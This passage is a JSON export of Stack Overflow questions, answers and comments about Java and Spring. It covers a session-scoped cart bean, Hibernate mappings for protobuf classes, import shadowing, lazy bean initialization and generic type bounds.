&quot;request scope&quot; controller is the only bean has an dependency on it.</p>\n<p>But usually the Controller should be &quot;singleton&quot; scope, unless you have a good reason for choosing another kind of scope. And if the Controller is &quot;singleton&quot; scope, you should specify the &quot;proxyMode&quot; attribute of the &quot;@Scope&quot; annotation.</p>\n"}],"owner":{"account_id":23312007,"reputation":27,"user_id":17391095,"display_name":"ttgqwe456"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":612,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70365189,"answer_count":2,"score":0,"last_activity_date":1639577593,"creation_date":1639575197,"question_id":70364588,"body_markdown":"I am having a Spring shopping project and I am working on a cart with I can add new product to it and store it in the session. I create a Cart class to store it in the session\r\n``` \r\nimport java.util.HashMap;\r\n\r\nimport org.springframework.stereotype.Component;\r\n\r\nimport org.springframework.context.annotation.Scope;\r\n\r\n@Component\r\n@Scope(&quot;session&quot;)\r\npublic class Cart {\r\n\t\r\n\t// key: product id\r\n\t// value: product information\r\n\tprivate HashMap&lt;Integer,Product&gt; productlist;\r\n\r\n\tpublic HashMap&lt;Integer, Product&gt; getProductlist() {\r\n\t\treturn productlist;\r\n\t}\r\n\r\n\tpublic void setProductlist(HashMap&lt;Integer, Product&gt; productlist) {\r\n\t\tthis.productlist = productlist;\r\n\t}\r\n\t\r\n}\r\n``` \r\nI create a Controller class to get the cart from session and add product to it\r\n``` \r\n@Controller\r\n@Scope(&quot;request&quot;)\r\npublic class AddToCartController {\r\n\r\n\t@Autowired\r\n\tprivate Cart cart;\r\n\t\r\n\t@Autowired\r\n\tProductService proService;\r\n\t\r\n\t@RequestMapping(&quot;/cart/add&quot;)\r\n\tpublic String addToCart(@RequestParam Optional&lt;String&gt; pid) {\r\n\t\t\r\n\t\tif(pid.isPresent()) {\r\n\t\t\t\r\n\t\t\tProduct productinfo = proService.getProductByPid(pid.get());\r\n\t\t\t\r\n\t\t\tif(productinfo.getQuantity()&gt;0) { \r\n\t\t\t\t\r\n\t\t\t\tint pidInteger = Integer.parseInt(pid.get());\r\n\t\t\t\t\r\n\t\t\t    \r\n\t\t\t\ttry {\r\n\t\t\t\t\tProduct product = cart.getProductlist().get(pidInteger);\r\n\t\t\t\t\t\r\n                    // there is already product in cart. add 1 to quantity\r\n\r\n\t\t\t\t\tcart.getProductlist().get(pidInteger).setQuantity(product.getQuantity()+1);\r\n\t\t\t\t\t\r\n\t\t\t\t} catch(NullPointerException e) {\r\n\r\n\t\t\t\t\t// add the new product to cart with quantity 1\r\n\r\n\t\t\t\t\tproductinfo.setQuantity(1);\r\n\t\t\t\t\tcart.getProductlist().put(pidInteger, productinfo);\r\n\t\t\t\t\t\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\t\r\n\t\t} \r\n\t\t\r\n\t\treturn &quot;redirect:/cart&quot;;\r\n\t}\r\n}\r\n``` \r\nBut when I call this controller it send back an error\r\n``` \r\njava.lang.NullPointerException: null\r\n\tat com.example.phonestore.controller.AddToCartController.addToCart(AddToCartController.java:45) ~[classes/:na]\r\n``` ","title":"Store and retrieve an object in session through @Scope(&quot;session&quot;)","body":"<p>I am having a Spring shopping project and I am working on a cart with I can add new product to it and store it in the session. I create a Cart class to store it in the session</p>\n<pre><code>import java.util.HashMap;\n\nimport org.springframework.stereotype.Component;\n\nimport org.springframework.context.annotation.Scope;\n\n@Component\n@Scope(&quot;session&quot;)\npublic class Cart {\n    \n    // key: product id\n    // value: product information\n    private HashMap&lt;Integer,Product&gt; productlist;\n\n    public HashMap&lt;Integer, Product&gt; getProductlist() {\n        return productlist;\n    }\n\n    public void setProductlist(HashMap&lt;Integer, Product&gt; productlist) {\n        this.productlist = productlist;\n    }\n    \n}\n</code></pre>\n<p>I create a Controller class to get the cart from session and add product to it</p>\n<pre><code>@Controller\n@Scope(&quot;request&quot;)\npublic class AddToCartController {\n\n    @Autowired\n    private Cart cart;\n    \n    @Autowired\n    ProductService proService;\n    \n    @RequestMapping(&quot;/cart/add&quot;)\n    public String addToCart(@RequestParam Optional&lt;String&gt; pid) {\n        \n        if(pid.isPresent()) {\n            \n            Product productinfo = proService.getProductByPid(pid.get());\n            \n            if(productinfo.getQuantity()&gt;0) { \n                \n                int pidInteger = Integer.parseInt(pid.get());\n                \n                \n                try {\n                    Product product = cart.getProductlist().get(pidInteger);\n                    \n                    // there is already product in cart. add 1 to quantity\n\n                    cart.getProductlist().get(pidInteger).setQuantity(product.getQuantity()+1);\n                    \n                } catch(NullPointerException e) {\n\n                    // add the new product to cart with quantity 1\n\n                    productinfo.setQuantity(1);\n                    cart.getProductlist().put(pidInteger, productinfo);\n                    \n                }\n                \n            }\n            \n        } \n        \n        return &quot;redirect:/cart&quot;;\n    }\n}\n</code></pre>\n<p>But when I call this controller it send back an error</p>\n<pre><code>java.lang.NullPointerException: null\n    at com.example.phonestore.controller.AddToCartController.addToCart(AddToCartController.java:45) ~[classes/:na]\n</code></pre>\n"},{"tags":["java","hibernate","kotlin","orm","protocol-buffers"],"owner":{"account_id":94293,"reputation":10816,"user_id":257530,"accept_rate":47,"display_name":"oneat"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":46,"favorite_count":0,"down_vote_count":0,"up_vote_count":2,"answer_count":0,"score":2,"last_activity_date":1639576267,"creation_date":1639576267,"question_id":70364835,"body_markdown":"## Context\r\n\r\nI have a case in a kotlin project, where I generate classes using protocol buffers.  \r\nI&#39;d like to create for those classes mapping definitions, so I could store them in db.  \r\nHowever, because protobuf classes are generated,  \r\nI cannot add Entity annotations to them.\r\n\r\nTherefore I am looking a way to annotate those classes outside of their definitions.\r\n\r\n## What I tried\r\n\r\nI was reading documentation for hibernate,  \r\nas I remembered it could create mapping definitions separated from class declarations:\r\n\r\nHibernate in 3.3 had an option to create xml mapping definitions:\r\nhttps://docs.jboss.org/hibernate/core/3.3/reference/en/html/mapping.html\r\n\r\nHowever, it seems missing from newer documentation and in 5.6 the closest I saw was:\r\nhttps://docs.jboss.org/hibernate/orm/5.6/userguide/html_single/Hibernate_User_Guide.html#dynamic-model\r\n\r\n\r\n## Questions\r\n\r\n - Is it possible to still use XML mapping definitions in hibernate?\r\n - Why XML approach was removed from the Hibernate documentation?\r\n\r\nOR\r\n\r\n - Are there any other solutions that would allow me to store protobuf objects in database **without using hibernate**?","title":"How to separate class declaration from its database relation definition","body":"<h2>Context</h2>\n<p>I have a case in a kotlin project, where I generate classes using protocol buffers.<br />\nI'd like to create for those classes mapping definitions, so I could store them in db.<br />\nHowever, because protobuf classes are generated,<br />\nI cannot add Entity annotations to them.</p>\n<p>Therefore I am looking a way to annotate those classes outside of their definitions.</p>\n<h2>What I tried</h2>\n<p>I was reading documentation for hibernate,<br />\nas I remembered it could create mapping definitions separated from class declarations:</p>\n<p>Hibernate in 3.3 had an option to create xml mapping definitions:\n<a href=\"https://docs.jboss.org/hibernate/core/3.3/reference/en/html/mapping.html\" rel=\"nofollow noreferrer\">https://docs.jboss.org/hibernate/core/3.3/reference/en/html/mapping.html</a></p>\n<p>However, it seems missing from newer documentation and in 5.6 the closest I saw was:\n<a href=\"https://docs.jboss.org/hibernate/orm/5.6/userguide/html_single/Hibernate_User_Guide.html#dynamic-model\" rel=\"nofollow noreferrer\">https://docs.jboss.org/hibernate/orm/5.6/userguide/html_single/Hibernate_User_Guide.html#dynamic-model</a></p>\n<h2>Questions</h2>\n<ul>\n<li>Is it possible to still use XML mapping definitions in hibernate?</li>\n<li>Why XML approach was removed from the Hibernate documentation?</li>\n</ul>\n<p>OR</p>\n<ul>\n<li>Are there any other solutions that would allow me to store protobuf objects in database <strong>without using hibernate</strong>?</li>\n</ul>\n"},{"tags":["java"],"answers":[{"tags":[],"owner":{"account_id":15895655,"reputation":1313,"user_id":11469519,"display_name":"tnavidi"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639559137,"creation_date":1639559137,"answer_id":70360936,"question_id":70360892,"body_markdown":"you&#39;re missing an &quot;i&quot;, and java doesn&#39;t use var, use `int` instead:\r\n\r\n    for(int i = 0; i &lt; snake.tail.length; i++){","title":"Error Code while writing a Snake Game with Java","body":"<p>you're missing an &quot;i&quot;, and java doesn't use var, use <code>int</code> instead:</p>\n<pre><code>for(int i = 0; i &lt; snake.tail.length; i++){\n</code></pre>\n"},{"tags":[],"owner":{"account_id":11825858,"reputation":1015,"user_id":8653765,"display_name":"M. Dudek"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639559204,"creation_date":1639559204,"answer_id":70360946,"question_id":70360892,"body_markdown":"In your code, you have the wrong condition construction:\r\n\r\n```java\r\n   &lt; snake.tail.length\r\n^\r\n|\r\n|\r\n```\r\n\r\nYou don&#39;t have anything on the left site. Probably you need the `i` variable here.\r\n\r\n```java\r\ni &lt; snake.tail.length\r\n```\r\n\r\n","title":"Error Code while writing a Snake Game with Java","body":"<p>In your code, you have the wrong condition construction:</p>\n<pre class=\"lang-java prettyprint-override\"><code>   &lt; snake.tail.length\n^\n|\n|\n</code></pre>\n<p>You don't have anything on the left site. Probably you need the <code>i</code> variable here.</p>\n<pre class=\"lang-java prettyprint-override\"><code>i &lt; snake.tail.length\n</code></pre>\n"}],"owner":{"account_id":23653093,"reputation":1,"user_id":17681754,"display_name":"Julian Melzer"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":62,"favorite_count":0,"down_vote_count":2,"up_vote_count":0,"answer_count":2,"score":-2,"last_activity_date":1639576082,"creation_date":1639558925,"question_id":70360892,"body_markdown":"I recently started to teach myself some Python and Java. So I tried to write some easy programs but with this snake game I tried I discovered a mysterious problem. Maybe someone of you knows where the error is.\r\n\r\nthe code:\r\n\r\n```java\r\nfor(var i = 0; &lt; snake.tail.length;i++){\r\n...\r\n```\r\n\r\nIf you need something else to engage this problem please let me know  \r\n\r\nJulian","title":"Error Code while writing a Snake Game with Java","body":"<p>I recently started to teach myself some Python and Java. So I tried to write some easy programs but with this snake game I tried I discovered a mysterious problem. Maybe someone of you knows where the error is.</p>\n<p>the code:</p>\n<pre class=\"lang-java prettyprint-override\"><code>for(var i = 0; &lt; snake.tail.length;i++){\n...\n</code></pre>\n<p>If you need something else to engage this problem please let me know</p>\n<p>Julian</p>\n"},{"tags":["java","spring","spring-boot","lazy-loading","spring-cloud-config-server"],"comments":[{"owner":{"account_id":290683,"reputation":12512,"user_id":592355,"display_name":"xerx593"},"score":0,"creation_date":1639576417,"post_id":70364783,"comment_id":124383742,"body_markdown":"try (in): `bootstrap.properties`(?;)","body":"try (in): <code>bootstrap.properties</code>(?;)"},{"owner":{"account_id":3192259,"reputation":117609,"user_id":2696260,"display_name":"M. Deinum"},"score":1,"creation_date":1639576439,"post_id":70364783,"comment_id":124383754,"body_markdown":"No. As that property is used very early i the process afaik. Which basically already pre-configures the context and then additional sources are loaded.","body":"No. As that property is used very early i the process afaik. Which basically already pre-configures the context and then additional sources are loaded."}],"owner":{"account_id":5841347,"reputation":54,"user_id":4663189,"display_name":"Samuel de Oliveira Marques"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":276,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"answer_count":0,"score":0,"last_activity_date":1639576025,"creation_date":1639576025,"question_id":70364783,"body_markdown":"Is that possible to use the **spring.main.lazy-initialization** property with config server?\r\n\r\nI have spring-boot microservices running on k8s. The properties are loaded from the config server based on the env.\r\n\r\nI just can&#39;t make it work. To enable lazy init with the property.\r\nThe only way it worked, was setting true on the SpringApplication flag before invoking the method run.\r\n\r\nTested on spring-boot 2.3.12.RELEASE","title":"Lazy load of spring beans","body":"<p>Is that possible to use the <strong>spring.main.lazy-initialization</strong> property with config server?</p>\n<p>I have spring-boot microservices running on k8s. The properties are loaded from the config server based on the env.</p>\n<p>I just can't make it work. To enable lazy init with the property.\nThe only way it worked, was setting true on the SpringApplication flag before invoking the method run.</p>\n<p>Tested on spring-boot 2.3.12.RELEASE</p>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1639574318,"post_id":70364377,"comment_id":124382756,"body_markdown":"it knows that because of the import statement ... the one you add for Observable is specific","body":"it knows that because of the import statement ... the one you add for Observable is specific"},{"owner":{"account_id":6845616,"reputation":257,"user_id":5264537,"display_name":"Aman Sharma"},"score":0,"creation_date":1639574391,"post_id":70364377,"comment_id":124382784,"body_markdown":"@Stultuske thanks. Could you send a reference to documentation?","body":"@Stultuske thanks. Could you send a reference to documentation?"},{"owner":{"account_id":3116234,"reputation":9296,"user_id":2636929,"display_name":"Stultuske"},"score":0,"creation_date":1639574525,"post_id":70364377,"comment_id":124382834,"body_markdown":"just avoid using wildcards in import statements.","body":"just avoid using wildcards in import statements."},{"owner":{"account_id":6845616,"reputation":257,"user_id":5264537,"display_name":"Aman Sharma"},"score":0,"creation_date":1639574620,"post_id":70364377,"comment_id":124382884,"body_markdown":"@Stultuske I am aware of that. I work on a meta-programming library for Java so I needed this information.","body":"@Stultuske I am aware of that. I work on a meta-programming library for Java so I needed this information."},{"owner":{"account_id":22057425,"reputation":135,"user_id":16320675,"display_name":"user16320675"},"score":1,"creation_date":1639578981,"post_id":70364377,"comment_id":124385020,"body_markdown":"[JLS 6.4.1. Shadowing](https://docs.oracle.com/javase/specs/jls/se17/html/jls-6.html#jls-6.4.1)","body":"<a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-6.html#jls-6.4.1\" rel=\"nofollow noreferrer\">JLS 6.4.1. Shadowing</a>"}],"answers":[{"tags":[],"owner":{"account_id":17849762,"reputation":104,"user_id":12965752,"display_name":"Bhushan"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1639574549,"creation_date":1639574549,"answer_id":70364456,"question_id":70364377,"body_markdown":"    **import rx.Observable;**\r\nThis one will be considered by the compiler because you have mentioned the specific path.\r\nbut you want to use from import java.util.* you have to use like this **java.util.Observable o = new java.util.Observable();**","title":"Which import should be considered?","body":"<pre><code>**import rx.Observable;**\n</code></pre>\n<p>This one will be considered by the compiler because you have mentioned the specific path.\nbut you want to use from import java.util.* you have to use like this <strong>java.util.Observable o = new java.util.Observable();</strong></p>\n"},{"tags":[],"owner":{"display_name":"user14215102"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1639574923,"creation_date":1639574923,"answer_id":70364525,"question_id":70364377,"body_markdown":"The single name import wins over the wildcard (called &quot;import-on-demand&quot; by the standard).\r\n\r\nTo cite chapter and verse:\r\n\r\nhttps://docs.oracle.com/javase/specs/jls/se11/html/jls-7.html#jls-7.5.2\r\n\r\n&quot;The declaration might be shadowed by a single-type-import declaration of a type whose simple name is...&quot;\r\n\r\nhttps://docs.oracle.com/javase/specs/jls/se11/html/jls-6.html#jls-6.4.1\r\n\r\n&quot;A type-import-on-demand declaration never causes any other declaration to be shadowed. &quot;","title":"Which import should be considered?","body":"<p>The single name import wins over the wildcard (called &quot;import-on-demand&quot; by the standard).</p>\n<p>To cite chapter and verse:</p>\n<p><a href=\"https://docs.oracle.com/javase/specs/jls/se11/html/jls-7.html#jls-7.5.2\" rel=\"nofollow noreferrer\">https://docs.oracle.com/javase/specs/jls/se11/html/jls-7.html#jls-7.5.2</a></p>\n<p>&quot;The declaration might be shadowed by a single-type-import declaration of a type whose simple name is...&quot;</p>\n<p><a href=\"https://docs.oracle.com/javase/specs/jls/se11/html/jls-6.html#jls-6.4.1\" rel=\"nofollow noreferrer\">https://docs.oracle.com/javase/specs/jls/se11/html/jls-6.html#jls-6.4.1</a></p>\n<p>&quot;A type-import-on-demand declaration never causes any other declaration to be shadowed. &quot;</p>\n"},{"tags":[],"owner":{"account_id":21017628,"reputation":21,"user_id":15444734,"display_name":"Matthias"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639575994,"creation_date":1639575994,"answer_id":70364774,"question_id":70364377,"body_markdown":"Just tried it, and basically, the Single-Type-Import declaration is overwriting the types from the Type-On-Demand (.*;) declaration. \r\n\r\nExample Type-on-Demand conflict - compile-time error:\r\n\r\n    import java.sql.*;\r\n    import java.util.*;\r\n\r\n    public class Test {\r\n         Date birthDate; // Date is ambiguous (!!)\r\n    }\r\n\r\n\r\nExample Single-Type-Import conflict - compile-time error:\r\n\r\n    import java.sql.Date;\r\n    import java.util.Date;  // Date already defined in single-type import (!!)\r\n\r\n    public class Test {\r\n         Date birthDate;\r\n    }\r\n\r\n\r\nExample Single-Type-Import / Type-On-Demand - compiles:\r\n\r\n    import java.sql.Date;\r\n    import java.util.*; \r\n\r\n    public class Test {\r\n         Date birthDate;    // resolves to java.sql.Date\r\n    }\r\n\r\n\r\n\r\nExample Type-On-Demand / Single-Type-Import - compiles:\r\n\r\n    import java.sql.*;\r\n    import java.util.Date; \r\n\r\n    public class Test {\r\n         Date birthDate;    // resolves to java.util.Date\r\n    }\r\n\r\nWhich is described in the language documentation (just found it): \r\n\r\n&gt; the (type-on-demand) declaration might be shadowed by a single-type-import declaration \r\n\r\n7.5.2. Type-Import-on-Demand Declarations\r\n\r\nhttps://docs.oracle.com/javase/specs/jls/se11/html/jls-7.html#jls-7.5\r\n\r\n\r\nThe case of naming conflict on that level is not described (at least I wasn&#39;t able to find it). Therefore just can give the answer by &quot;try-and-error&quot;.\r\n","title":"Which import should be considered?","body":"<p>Just tried it, and basically, the Single-Type-Import declaration is overwriting the types from the Type-On-Demand (.*;) declaration.</p>\n<p>Example Type-on-Demand conflict - compile-time error:</p>\n<pre><code>import java.sql.*;\nimport java.util.*;\n\npublic class Test {\n     Date birthDate; // Date is ambiguous (!!)\n}\n</code></pre>\n<p>Example Single-Type-Import conflict - compile-time error:</p>\n<pre><code>import java.sql.Date;\nimport java.util.Date;  // Date already defined in single-type import (!!)\n\npublic class Test {\n     Date birthDate;\n}\n</code></pre>\n<p>Example Single-Type-Import / Type-On-Demand - compiles:</p>\n<pre><code>import java.sql.Date;\nimport java.util.*; \n\npublic class Test {\n     Date birthDate;    // resolves to java.sql.Date\n}\n</code></pre>\n<p>Example Type-On-Demand / Single-Type-Import - compiles:</p>\n<pre><code>import java.sql.*;\nimport java.util.Date; \n\npublic class Test {\n     Date birthDate;    // resolves to java.util.Date\n}\n</code></pre>\n<p>Which is described in the language documentation (just found it):</p>\n<blockquote>\n<p>the (type-on-demand) declaration might be shadowed by a single-type-import declaration</p>\n</blockquote>\n<p>7.5.2. Type-Import-on-Demand Declarations</p>\n<p><a href=\"https://docs.oracle.com/javase/specs/jls/se11/html/jls-7.html#jls-7.5\" rel=\"nofollow noreferrer\">https://docs.oracle.com/javase/specs/jls/se11/html/jls-7.html#jls-7.5</a></p>\n<p>The case of naming conflict on that level is not described (at least I wasn't able to find it). Therefore just can give the answer by &quot;try-and-error&quot;.</p>\n"}],"owner":{"account_id":6845616,"reputation":257,"user_id":5264537,"display_name":"Aman Sharma"},"comment_count":5,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":87,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70364525,"answer_count":3,"score":0,"last_activity_date":1639575994,"creation_date":1639574229,"question_id":70364377,"body_markdown":"Consider the following code snippet.\r\n\r\n```java\r\npackage spoon;\r\n\r\nimport rx.Observable;\r\nimport java.util.*;\r\n\r\npublic class Test {\r\n    public void test() {\r\n        Observable o = new Observable();\r\n    }\r\n}\r\n```\r\n\r\nThis code compiles well with Java 11 even though I thought it should not. `Observable` is also a java class in [`java.util`][1] and I do not understand how the compiler knows whether to use `Observable` from `java.util` or my custom package `rx`.\r\n\r\nNote that `java.util.Observable` was deprecated in Java 9, however, I don&#39;t think so it should have any effect on imports.\r\n\r\n\r\n  [1]: https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Observable.html","title":"Which import should be considered?","body":"<p>Consider the following code snippet.</p>\n<pre class=\"lang-java prettyprint-override\"><code>package spoon;\n\nimport rx.Observable;\nimport java.util.*;\n\npublic class Test {\n    public void test() {\n        Observable o = new Observable();\n    }\n}\n</code></pre>\n<p>This code compiles well with Java 11 even though I thought it should not. <code>Observable</code> is also a java class in <a href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Observable.html\" rel=\"nofollow noreferrer\"><code>java.util</code></a> and I do not understand how the compiler knows whether to use <code>Observable</code> from <code>java.util</code> or my custom package <code>rx</code>.</p>\n<p>Note that <code>java.util.Observable</code> was deprecated in Java 9, however, I don't think so it should have any effect on imports.</p>\n"},{"tags":["java","string","generics"],"comments":[{"owner":{"account_id":162699,"reputation":138060,"user_id":3788176,"accept_rate":54,"display_name":"Andy Turner"},"score":3,"creation_date":1639571922,"post_id":70363805,"comment_id":124381748,"body_markdown":"The way around it is to define some interface which allows a common way to access the parts of ComboBoxItem and String that you need.","body":"The way around it is to define some interface which allows a common way to access the parts of ComboBoxItem and String that you need."},{"owner":{"account_id":3418957,"reputation":1176,"user_id":4029174,"accept_rate":100,"display_name":"bananas"},"score":0,"creation_date":1639572091,"post_id":70363805,"comment_id":124381819,"body_markdown":"I assume both will have different implementations. If yes, then instead of adding if else in code create a common interface and then provide implementation for both. and for more generic way you can use them via factory","body":"I assume both will have different implementations. If yes, then instead of adding if else in code create a common interface and then provide implementation for both. and for more generic way you can use them via factory"},{"owner":{"account_id":2182934,"reputation":2525,"user_id":1932011,"accept_rate":71,"display_name":"JayC667"},"score":1,"creation_date":1639572134,"post_id":70363805,"comment_id":124381838,"body_markdown":"As a workaround, you could write a wrapper class that encapsulates `String`... I cannot help with the question itself...","body":"As a workaround, you could write a wrapper class that encapsulates <code>String</code>... I cannot help with the question itself..."},{"owner":{"account_id":960307,"reputation":107861,"user_id":984823,"display_name":"Joop Eggen"},"score":1,"creation_date":1639572324,"post_id":70363805,"comment_id":124381924,"body_markdown":"`class StringComboBoxItem extends ComboBoxItem`","body":"<code>class StringComboBoxItem extends ComboBoxItem</code>"}],"answers":[{"tags":[],"owner":{"account_id":5150443,"reputation":34158,"user_id":4125191,"display_name":"RealSkeptic"},"down_vote_count":0,"up_vote_count":3,"is_accepted":true,"score":3,"last_activity_date":1639572736,"creation_date":1639572736,"answer_id":70364015,"question_id":70363805,"body_markdown":"There is no &quot;or&quot; operator for generics, and for a simple reason.\r\n\r\nThe idea of stating the type at the beginning is to allow you to use *methods* from that type in your implementation of the class.\r\n\r\nWhen you use the &quot;and&quot; operator (`extends A &amp; B`), you know that whatever object is passed to you, you can access any of the `A` class&#39;s methods as well as any of the `B` class&#39;s method.\r\n\r\nBut what would happen if it was an &quot;or&quot;? Then you are passed an object that can either be a `ComboBoxItem` allowing you to use `ComboBoxItem`&#39;s methods, or it is just a string, which means you can&#39;t use any such methods. At compile time, you don&#39;t know which object you are passed, so there is no point in giving the type.\r\n\r\nThe &quot;Or&quot; is not helpful. If you are not using any method from the object, you may as well not use `extends` at all.\r\n\r\n---\r\n\r\nThe real question here is what you are trying to do which can apply to strings as well as combo box items but not to anything else. It smells like a design issue.","title":"Java Generics - Type must be from Class T &quot;or&quot; extend S","body":"<p>There is no &quot;or&quot; operator for generics, and for a simple reason.</p>\n<p>The idea of stating the type at the beginning is to allow you to use <em>methods</em> from that type in your implementation of the class.</p>\n<p>When you use the &quot;and&quot; operator (<code>extends A &amp; B</code>), you know that whatever object is passed to you, you can access any of the <code>A</code> class's methods as well as any of the <code>B</code> class's method.</p>\n<p>But what would happen if it was an &quot;or&quot;? Then you are passed an object that can either be a <code>ComboBoxItem</code> allowing you to use <code>ComboBoxItem</code>'s methods, or it is just a string, which means you can't use any such methods. At compile time, you don't know which object you are passed, so there is no point in giving the type.</p>\n<p>The &quot;Or&quot; is not helpful. If you are not using any method from the object, you may as well not use <code>extends</code> at all.</p>\n<hr />\n<p>The real question here is what you are trying to do which can apply to strings as well as combo box items but not to anything else. It smells like a design issue.</p>\n"},{"tags":[],"owner":{"account_id":23067373,"reputation":640,"user_id":17181638,"display_name":"3Fish"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639575990,"creation_date":1639575990,"answer_id":70364772,"question_id":70363805,"body_markdown":"In short, this is not possible. A class cannot inherit from one  of two interfaces, as it would be impossible to determine which class is actually implemented.\r\n\r\nYou could implement a string wrapper, as JayC667 mentioned, and have it implement your ComboBoxItem interface.\r\nI assume that you need some special functions introduced by ComboBoxItem anyway.\r\n\r\nsome example:\r\n``` java\r\ninterface ComboBoxItem{\r\n\r\n    String getDisplayText();\r\n\r\n    default Color getBgColor(){\r\n        return Color.WHITE;\r\n    }\r\n    \r\n    default Color getFgColor(){\r\n        return Color.BLACK;\r\n    }\r\n\r\n    default ImageIcon getIcon(){\r\n        return null;\r\n    }\r\n\r\n    default boolean useIcon(){\r\n        return false;\r\n    }\r\n}\r\n``` \r\nAnd with a simple implementation which just takes String input.\r\n\r\n``` java \r\npublic class StringCbItem implements ComboBoxItem {\r\n    private final String text;\r\n\r\n    StringCbItem (String text){\r\n        this.text = text;\r\n    }\r\n\r\n    @Override\r\n    String getDisplayText(){\r\n        return text;\r\n    }\r\n}\r\n```\r\n\r\nFor the ComboBox I would probably just use the defaul JComboBox.\r\nYou can override its display and rendering behavior by passing a custom ListCellRenderer implementation.\r\n\r\n``` java\r\npublic class MyRenderer extends JLabel implements ListCellRenderer&lt;ComboBoxItem&gt; {\r\n     public MyRenderer () {\r\n         setOpaque(true);\r\n     }\r\n\r\n     public Component getListCellRendererComponent(JList&lt;?&gt; list,\r\n                                                   ComboBoxItem value,\r\n                                                   int index,\r\n                                                   boolean isSelected,\r\n                                                   boolean cellHasFocus) {\r\n\r\n         setText(value.getDisplayText());\r\n\r\n         setBackground(value.getBgColor());\r\n         setForeground(value.getFgColor());\r\n\r\n         if(value.useIcon()){\r\n             setIcon(value.getIcon());\r\n         }\r\n\r\n         return this;\r\n     }\r\n }\r\n``` \r\nThis is just some example for how to do it and is only meant as a starting point!  \r\nYou can read further into it here:  \r\n[How to Use Combo Boxes](https://docs.oracle.com/javase/tutorial/uiswing/components/combobox.html)  \r\n[Interface ListCellRenderer](https://docs.oracle.com/javase/7/docs/api/javax/swing/ListCellRenderer.html)","title":"Java Generics - Type must be from Class T &quot;or&quot; extend S","body":"<p>In short, this is not possible. A class cannot inherit from one  of two interfaces, as it would be impossible to determine which class is actually implemented.</p>\n<p>You could implement a string wrapper, as JayC667 mentioned, and have it implement your ComboBoxItem interface.\nI assume that you need some special functions introduced by ComboBoxItem anyway.</p>\n<p>some example:</p>\n<pre class=\"lang-java prettyprint-override\"><code>interface ComboBoxItem{\n\n    String getDisplayText();\n\n    default Color getBgColor(){\n        return Color.WHITE;\n    }\n    \n    default Color getFgColor(){\n        return Color.BLACK;\n    }\n\n    default ImageIcon getIcon(){\n        return null;\n    }\n\n    default boolean useIcon(){\n        return false;\n    }\n}\n</code></pre>\n<p>And with a simple implementation which just takes String input.</p>\n<pre class=\"lang-java prettyprint-override\"><code>public class StringCbItem implements ComboBoxItem {\n    private final String text;\n\n    StringCbItem (String text){\n        this.text = text;\n    }\n\n    @Override\n    String getDisplayText(){\n        return text;\n    }\n}\n</code></pre>\n<p>For the ComboBox I would probably just use the defaul JComboBox.\nYou can override its display and rendering behavior by passing a custom ListCellRenderer implementation.</p>\n<pre class=\"lang-java prettyprint-override\"><code>public class MyRenderer extends JLabel implements ListCellRenderer&lt;ComboBoxItem&gt; {\n     public MyRenderer () {\n         setOpaque(true);\n     }\n\n     public Component getListCellRendererComponent(JList&lt;?&gt; list,\n                                                   ComboBoxItem value,\n                                                   int index,\n                                                   boolean isSelected,\n                                                   boolean cellHasFocus) {\n\n         setText(value.getDisplayText());\n\n         setBackground(value.getBgColor());\n         setForeground(value.getFgColor());\n\n         if(value.useIcon()){\n             setIcon(value.getIcon());\n         }\n\n         return this;\n     }\n }\n</code></pre>\n<p>This is just some example for how to do it and is only meant as a starting point!<br />\nYou can read further into it here:<br />\n<a href=\"https://docs.oracle.com/javase/tutorial/uiswing/components/combobox.html\" rel=\"nofollow noreferrer\">How to Use Combo Boxes</a><br />\n<a href=\"https://docs.oracle.com/javase/7/docs/api/javax/swing/ListCellRenderer.html\" rel=\"nofollow noreferrer\">Interface ListCellRenderer</a></p>\n"}],"owner":{"account_id":18679642,"reputation":161,"user_id":13616500,"display_name":"CLR 123"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":127,"favorite_count":0,"down_vote_count":0,"up_vote_count":7,"accepted_answer_id":70364015,"answer_count":2,"score":7,"last_activity_date":1639575990,"creation_date":1639571767,"question_id":70363805,"body_markdown":"I am developing a ComboBox (more for context than actual significance), and I would like to know if the &quot;or&quot; operator exists in Java generics. For now, the declaration looks something like that:\r\n```\r\npublic class SComboBox&lt;T extends ComboBoxItem&gt; extends JPanel {\r\n```\r\nWhere `ComboBoxItem` is an interface I created for items that can be used in the ComboBox. However, I&#39;d also like to accept `String` as a type, which seems like a difficult task since:\r\n1. `String` is a `final class` so there&#39;s no way anyone could extend it.\r\n2. I am not sure if you can put either something like &quot;|&quot; (or) operator, or just outright specify an acceptable class. Since there **is** an &quot;and&quot; operator (`&lt;T extends A &amp; B&gt;`) I imagined it would make sense to have the &quot;or&quot; (|) as well.\r\n\r\nMy question is essentially point 2. Can I, in generics, specify a class I want to accept and/or use something like a &quot;|&quot;? If not, is there any workaround or should I ditch the idea of using generics?","title":"Java Generics - Type must be from Class T 